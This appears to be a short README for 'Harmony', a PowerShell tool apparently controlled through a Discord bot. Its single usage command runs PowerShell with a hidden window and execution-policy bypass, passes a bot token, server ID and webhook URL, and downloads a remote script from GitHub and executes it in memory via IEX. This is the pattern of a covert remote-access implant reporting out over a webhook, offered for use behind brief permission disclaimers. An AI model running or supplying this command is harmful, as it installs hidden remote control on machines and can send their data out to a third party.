# Harmony PowerShell Script

This PowerShell script enables you to run a script directly from memory on a remote computer you own or have permission to use. It allows for greater efficiency and auto-updates whenever the script is updated.

### **Usage Instructions:**

To execute the script, run the following command on the remote computer:

```powershell
powershell -W Hidden -EP Bypass -C "$TOKEN = '<YOUR_BOT_TOKEN>'; $serverID = '<YOUR_SERVER_ID>'; $whURL = '<YOUR_WEBHOOK_URL>'; IEX (IWR 'https://raw.githubusercontent.com/olivia1246/harmony/refs/heads/powershell/harmony.ps1' -UseBasicParsing); exit"
```

Ensure you have permission to run this script on the target machine.
